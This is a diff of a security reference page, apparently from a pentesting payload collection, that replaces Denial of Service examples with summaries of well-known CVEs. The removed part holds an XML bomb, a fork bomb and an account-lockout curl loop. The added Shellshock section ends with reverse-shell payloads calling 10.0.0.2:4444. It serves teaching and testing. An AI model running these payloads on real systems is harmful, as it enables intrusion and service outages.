@@ -1,101 +1,85 @@
-# Denial of Service
+# Common Vulnerabilities and Exposures
 
-> A Denial of Service (DoS) attack aims to make a service unavailable by overwhelming it with a flood of illegitimate requests or exploiting vulnerabilities in the target's software to crash or degrade performance. In a Distributed Denial of Service (DDoS), attackers use multiple sources (often compromised machines) to perform the attack simultaneously.
+> A CVE (Common Vulnerabilities and Exposures) is a unique identifier assigned to a publicly known cybersecurity vulnerability. CVEs help standardize the naming and tracking of vulnerabilities, making it easier for organizations, security professionals, and software vendors to share information and manage risks associated with these vulnerabilities. Each CVE entry includes a brief description of the vulnerability, its potential impact, and details about affected software or systems.
 
 ## Summary
 
-* [Methodology](#methodology)
-    * [Locking Customer Accounts](#locking-customer-accounts)
-    * [File Limits on FileSystem](#file-limits-on-filesystem)
-    * [Memory Exhaustion - Technology Related](#memory-exhaustion---technology-related)
+* [Tools](#tools)
+* [Big CVEs in the last 15 years](#big-cves-in-the-last-15-years)
+    * [CVE-2017-0144 - EternalBlue](#cve-2017-0144---eternalblue)
+    * [CVE-2017-5638 - Apache Struts 2](#cve-2017-5638---apache-struts-2)
+    * [CVE-2018-7600 - Drupalgeddon 2](#cve-2018-7600---drupalgeddon-2)
+    * [CVE-2019-0708 - BlueKeep](#cve-2019-0708---bluekeep)
+    * [CVE-2019-19781 - Citrix ADC Netscaler](#cve-2019-19781---citrix-adc-netscaler)
+    * [CVE-2014-0160 - Heartbleed](#cve-2014-0160---heartbleed)
+    * [CVE-2014-6271 - Shellshock](#cve-2014-6271---shellshock)
 * [References](#references)
 
-## Methodology
+## Tools
 
-Here are some examples of Denial of Service (DoS) attacks. These examples should serve as a reference for understanding the concept, but any DoS testing should be conducted cautiously, as it can disrupt the target environment and potentially result in loss of access or exposure of sensitive data.
+* [Trickest CVE Repository - Automated collection of CVEs and PoC's](https://github.com/trickest/cve)
+* [Nuclei Templates - Community curated list of templates for the nuclei engine to find security vulnerabilities in applications](https://github.com/projectdiscovery/nuclei-templates)
+* [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
+* [CVE Details - The ultimate security vulnerability datasource](https://www.cvedetails.com)
 
-### Locking Customer Accounts
+## Big CVEs in the last 15 years
 
-Example of Denial of Service that can occur when testing customer accounts.
-Be very careful as this is most likely **out-of-scope** and can have a high impact on the business.
+### CVE-2017-0144 - EternalBlue
 
-* Multiple attempts on the login page when the account is temporary/indefinitely banned after X bad attempts.
+EternalBlue exploits a vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol. The vulnerability exists because the SMB version 1 (SMBv1) server in various versions of Microsoft Windows mishandles specially crafted packets from remote attackers, allowing them to execute arbitrary code on the target computer.
 
-    ```ps1
-    for i in {1..100}; do curl -X POST -d "username=user&password=wrong" <target_login_url>; done
-    ```
+Afftected systems:
 
-### File Limits on FileSystem
+* Windows Vista SP2
+* Windows Server 2008 SP2 and R2 SP1
+* Windows 7 SP1
+* Windows 8.1
+* Windows Server 2012 Gold and R2
+* Windows RT 8.1
+* Windows 10 Gold, 1511, and 1607
+* Windows Server 2016
 
-When a process is writing a file on the server, try to reach the maximum number of files allowed by the filesystem format. The system should output a message: `No space left on device` when the limit is reached.
+### CVE-2017-5638 - Apache Struts 2
 
-| Filesystem | Maximum Inodes             |
-| ---------- | -------------------------- |
-| BTRFS      | 2^64 (~18 quintillion)     |
-| EXT4       | ~4 billion                 |
-| FAT32      | ~268 million files         |
-| NTFS       | ~4.2 billion (MFT entries) |
-| XFS        | Dynamic (disk size)        |
-| ZFS        | ~281 trillion              |
+On March 6th, a new remote code execution (RCE) vulnerability in Apache Struts 2 was made public. This recent vulnerability, CVE-2017-5638, allows a remote attacker to inject operating system commands into a web application through the "Content-Type" header.
 
-An alternative of this technique would be to fill a file used by the application until it reaches the maximum size allowed by the filesystem, for example it can occur on a SQLite database or a log file.
+### CVE-2018-7600 - Drupalgeddon 2
 
-FAT32 has a significant limitation of **4 GB**, which is why it's often replaced with exFAT or NTFS for larger files.
+A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x. This potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could result in the site being completely compromised.
 
-Modern filesystems like BTRFS, ZFS, and XFS support exabyte-scale files, well beyond current storage capacities, making them future-proof for large datasets.
+### CVE-2019-0708 - BlueKeep
 
-### Memory Exhaustion - Technology Related
+A remote code execution vulnerability exists in Remote Desktop Services – formerly known as Terminal Services – when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests. This vulnerability is pre-authentication and requires no user interaction. An attacker who successfully exploited this vulnerability could execute arbitrary code on the target system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.
 
-Depending on the technology used by the website, an attacker may have the ability to trigger specific functions or paradigm that will consume a huge chunk of memory.
+### CVE-2019-19781 - Citrix ADC Netscaler
 
-* **XML External Entity**: Billion laughs attack/XML bomb
+A remote code execution vulnerability in Citrix Application Delivery Controller (ADC) formerly known as NetScaler ADC and Citrix Gateway formerly known as NetScaler Gateway that, if exploited, could allow an unauthenticated attacker to perform arbitrary code execution.
 
-    ```xml
-    <?xml version="1.0"?>
-    <!DOCTYPE lolz [
-    <!ENTITY lol "lol">
-    <!ELEMENT lolz (#PCDATA)>
-    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
-    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
-    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
-    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
-    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
-    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
-    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
-    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
-    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
-    ]>
-    <lolz>&lol9;</lolz>
-    ```
+Affected products:
 
-* **GraphQL**: Deeply-nested GraphQL queries.
+* Citrix ADC and Citrix Gateway version 13.0 all supported builds
+* Citrix ADC and NetScaler Gateway version 12.1 all supported builds
+* Citrix ADC and NetScaler Gateway version 12.0 all supported builds
+* Citrix ADC and NetScaler Gateway version 11.1 all supported builds
+* Citrix NetScaler ADC and NetScaler Gateway version 10.5 all supported builds
 
-    ```ps1
-    query { 
-        repository(owner:"rails", name:"rails") {
-            assignableUsers (first: 100) {
-                nodes {
-                    repositories (first: 100) {
-                        nodes {
-                            
-                        }
-                    }
-                }
-            }
-        }
-    }
-    ```
+### CVE-2014-0160 - Heartbleed
 
-* **Image Resizing**: try to send invalid pictures with modified headers, e.g: abnormal size, big number of pixels.
-* **SVG handling**: SVG file format is based on XML, try the billion laughs attack.
-* **Regular Expression**: ReDoS
-* **Fork Bomb**: rapidly creates new processes in a loop, consuming system resources until the machine becomes unresponsive.
+The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM) and some virtual private networks (VPNs).
 
-    ```ps1
-    :(){ :|:& };:
-    ```
+### CVE-2014-6271 - Shellshock
+
+Shellshock, also known as Bashdoor is a family of security bug in the widely used Unix Bash shell, the first of which was disclosed on 24 September 2014. Many Internet-facing services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.
+
+```powershell
+echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\r\n"
+curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi" 
+```
 
 ## References
 
-* [DEF CON 32 - Practical Exploitation of DoS in Bug Bounty - Roni Lupin Carta - October 16, 2024](https://web.archive.org/web/20241115121102/https://youtu.be/b7WlUofPJpU)
-* [Denial of Service Cheat Sheet - OWASP Cheat Sheet Series - July 16, 2019](https://web.archive.org/web/20260303124303/https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)
+* [The Heartbleed Bug - Heartbleed - April 7, 2014](https://web.archive.org/web/20260302163556/https://heartbleed.com/)
+* [Shellshock (software bug) - Wikipedia - September 29, 2014](https://web.archive.org/web/20140929214920/http://en.wikipedia.org:80/wiki/Shellshock_(software_bug))
+* [Apache Struts Equifax Hack Analysis Part 1: CVE-2017-5638 - Imperva - March 9, 2017](https://web.archive.org/web/20180305002332/https://www.imperva.com/blog/2017/03/cve-2017-5638-new-remote-code-execution-rce-vulnerability-in-apache-struts-2/)
+* [EternalBlue - Wikipedia - March 4, 2026](https://web.archive.org/web/20260304111336/https://en.wikipedia.org/wiki/EternalBlue)
+* [CVE-2019-0708 | Remote Desktop Services Remote Code Execution Vulnerability - Microsoft - November 4, 2020](https://web.archive.org/web/20201104070840/https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708)
